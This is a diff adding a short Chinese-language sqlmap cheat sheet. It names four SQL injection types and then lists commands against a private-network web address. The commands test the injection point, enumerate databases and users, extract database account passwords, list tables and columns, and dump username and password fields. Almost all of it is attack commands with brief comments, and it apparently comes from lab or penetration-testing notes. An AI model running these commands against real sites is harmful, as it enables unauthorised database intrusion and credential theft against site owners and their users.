@@ -1,0 +1,15 @@
+注入类型有四种分别为：boolean-based blind、error-based、stacked queries、inline query。
+
+sqlmap -u 'http://192.168.87.19/index.php?r=default/news/content&id=12' #-u 注入点　　　检测注入点是否可用
+sqlmap -u 'http://192.168.87.19/index.php?r=default/news/content&id=12' --dbs　　　 #可曝出该sqlserver中所有数据库名称
+sqlmap -u 'http://192.168.87.19/index.php?r=default/news/content&id=12' --current-db　　　#web当前使用的数据库
+sqlmap -u 'http://192.168.87.19/index.php?r=default/news/content&id=12' --current-user　　＃web数据库使用账户
+sqlmap -u 'http://192.168.87.19/index.php?r=default/news/content&id=12' --users　　　　＃列出sql所有用户
+sqlmap -u 'http://192.168.87.19/index.php?r=default/news/content&id=12' --passwords　　　＃数据库账户与密码
+sqlmap -u 'http://192.168.87.19/index.php?r=default/news/content&id=12' --tables　　　　＃输出所有的表
+sqlmap -u 'http://192.168.87.19/index.php?r=default/news/content&id=12  --dump
+sqlmap -u 'http://192.168.87.19/index.php?r=default/news/content&id=12' -D 【数据库名】 --tables　　＃-D 指定数据库名
+
+sqlmap -u 'http://192.168.87.19/index.php?r=default/news/content&id=12' -D 【数据库名】 -T 【表名】 --columns　　＃-T：指定要列出字段的表　　　--columns　列出了所有的列字段
+
+sqlmap -u 'http://192.168.87.19/index.php?r=default/news/content&id=12' -D 【数据库名】 -T 【表名】 -C　"username,realname,password" --dump　　　　　＃　-C ：指定要暴的字段　　--dump：将结果导出
